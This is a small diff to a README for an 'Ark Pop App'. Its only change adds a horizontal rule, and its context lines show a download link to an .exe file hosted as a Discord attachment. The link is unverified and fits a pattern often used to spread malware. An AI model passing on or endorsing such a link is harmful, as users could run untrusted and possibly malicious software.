@@ -26,6 +26,7 @@ Get the latest version of the Ark Pop App here:
 
 [Download NX - Ark Pop](https://cdn.discordapp.com/attachments/1360757090624344276/1360757141916487830/NX_-_ARK_POP.exe?ex=67fc4758&is=67faf5d8&hm=34e634e5253dc7a82ea7aeffb7beeba5c88141bb3b89666207a607715203bc51&)
 
+---
 
 ## 🤝 Contribute & Community
 
